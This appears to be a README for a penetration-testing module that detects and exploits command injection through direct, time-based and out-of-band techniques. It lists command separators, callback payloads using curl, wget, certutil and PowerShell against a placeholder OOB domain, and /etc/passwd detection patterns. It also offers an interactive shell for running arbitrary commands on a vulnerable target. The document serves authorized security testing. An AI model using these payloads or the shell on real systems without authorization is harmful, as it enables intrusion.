# Command Injection Module

## Overview

The Command Injection module provides automated testing for command injection vulnerabilities with support for:
- Direct command injection with visible output
- Time-based blind command injection
- Out-of-band (OOB) blind command injection using DNS/HTTP callbacks
- Interactive shell interface for exploitation

## Features

### 1. Multiple Injection Techniques

**Direct Injection:**
- Tests for command injection with visible output in responses
- Detects common command output patterns (uid, gid, directory listings, etc.)
- Supports multiple command separators

**Time-Based Blind:**
- Uses timing delays to detect blind command injection
- Adaptive baseline measurement
- Verification through multiple requests

**OOB Blind:**
- Integrates with OOB Listener for callback-based detection
- Generates platform-specific payloads (Unix/Linux, Windows)
- Supports both HTTP and DNS callbacks

### 2. Command Separators

The module tests multiple command separators:
- `;` (semicolon)
- `|` (pipe)
- `&` (ampersand)
- `&&` (double ampersand)
- `||` (double pipe)
- `\n` (newline)
- `` ` `` (backtick)
- `$()` (command substitution)

### 3. Interactive Shell

After successful injection, provides an interactive shell interface:
- Execute arbitrary commands through the injection point
- Command history tracking
- Automatic payload construction using the discovered separator

## Usage

### Basic Testing

```python
from app.modules.command_injection import CommandInjectionTester, InjectionPoint
from app.core.request_handler import RequestHandler
from app.core.oob_listener import OOBListener

# Initialize components
request_handler = RequestHandler()
oob_listener = OOBListener()
await oob_listener.start()

# Create tester
tester = CommandInjectionTester(
    request_handler=request_handler,
    oob_listener=oob_listener
)

# Define injection point
injection_point = InjectionPoint(
    parameter="filename",
    location="query",
    original_value="test.txt",
    url="http://example.com/view?filename=test.txt",
    method="GET"
)

# Test for vulnerabilities
results = await tester.test_injection_point(injection_point)

for result in results:
    if result.is_vulnerable:
        print(f"Vulnerable! Type: {result.injection_type.value}")
        print(f"Separator: {result.separator}")
        print(f"Payload: {result.payload}")
        print(f"Confidence: {result.confidence}")
```

### Testing Specific Techniques

```python
from app.modules.command_injection import CommandInjectionType

# Test only OOB blind injection
results = await tester.test_injection_point(
    injection_point,
    techniques=[CommandInjectionType.BLIND_OOB]
)
```

### Using Interactive Shell

```python
from app.modules.command_injection import InteractiveShell

# After finding a vulnerability
if result.is_vulnerable:
    shell = InteractiveShell(
        request_handler=request_handler,
        injection_point=injection_point,
        injection_result=result
    )
    
    # Execute commands
    output = await shell.execute_command("whoami")
    print(output)
    
    output = await shell.execute_command("ls -la")
    print(output)
    
    # View history
    history = shell.get_history()
    for cmd, output in history:
        print(f"Command: {cmd}")
        print(f"Output: {output[:100]}...")
```

### POST Parameter Injection

```python
injection_point = InjectionPoint(
    parameter="backup_file",
    location="post",
    original_value="backup.tar",
    url="http://example.com/backup",
    method="POST",
    data={"backup_file": "backup.tar", "action": "restore"}
)

results = await tester.test_injection_point(injection_point)
```

### Header Injection

```python
injection_point = InjectionPoint(
    parameter="User-Agent",
    location="header",
    original_value="Mozilla/5.0",
    url="http://example.com/",
    method="GET",
    headers={"User-Agent": "Mozilla/5.0"}
)

results = await tester.test_injection_point(injection_point)
```

## Architecture

### CommandInjectionTester

Main class for testing command injection vulnerabilities.

**Methods:**
- `test_injection_point()`: Test an injection point with multiple techniques
- `_test_direct_injection()`: Test for direct command injection
- `_test_time_based_blind()`: Test for time-based blind injection
- `_test_oob_blind()`: Test for OOB blind injection
- `_generate_oob_payloads()`: Generate platform-specific OOB payloads
- `_detect_command_output()`: Detect command output patterns
- `_extract_delay_from_command()`: Extract expected delay from commands

### InteractiveShell

Provides an interactive shell interface after successful injection.

**Methods:**
- `execute_command()`: Execute a command through the injection point
- `get_history()`: Get command execution history
- `clear_history()`: Clear command history

### Data Models

**InjectionPoint:**
- Represents a potential injection point
- Contains URL, parameter, location, method, headers, data

**CommandInjectionResult:**
- Contains test results
- Includes vulnerability status, type, separator, payload
- Provides confidence score and evidence

## OOB Payloads

The module generates platform-specific OOB payloads:

**Unix/Linux:**
- `curl http://oob-domain/unique-id`
- `wget http://oob-domain/unique-id`
- `nslookup unique-id.oob-domain`
- `dig unique-id.oob-domain`
- `ping -c 1 unique-id.oob-domain`

**Windows:**
- `powershell -c "Invoke-WebRequest -Uri http://oob-domain/unique-id"`
- `certutil -urlcache -split -f http://oob-domain/unique-id`
- `nslookup unique-id.oob-domain`
- `ping -n 1 unique-id.oob-domain`

## Detection Patterns

The module detects command output using regex patterns:

- `uid=\d+\([^)]+\)` - Unix user ID
- `gid=\d+\([^)]+\)` - Unix group ID
- `root:x:\d+:\d+` - /etc/passwd entry
- `[A-Z]:\\` - Windows path
- `total \d+` - ls -la output
- `drwx` - Directory permissions
- `-rw-` - File permissions
- `Volume in drive` - Windows dir output
- `Directory of` - Windows dir output

## Requirements

**Validates:**
- Requirement 7.1: Test payloads with command separators (;, |, &)
- Requirement 7.2: Generate unique OOB payloads for blind RCE
- Requirement 7.3: Integrate with OOB Listener for callback detection
- Requirement 7.4: Provide shell interface after successful injection
- Requirement 7.5: Use unique identifiers for concurrent tests

## Integration

The module integrates with:
- **Request Handler**: For HTTP communication
- **OOB Listener**: For blind RCE detection via callbacks
- **Payload Engine**: For payload management and encoding
- **Session Manager**: For maintaining authenticated sessions

## Security Considerations

This module is designed for:
- Authorized CTF competitions
- Legal bug bounty programs
- Controlled vulnerable-by-design platforms
- Educational purposes with proper authorization

**Never use this module against systems without explicit authorization.**
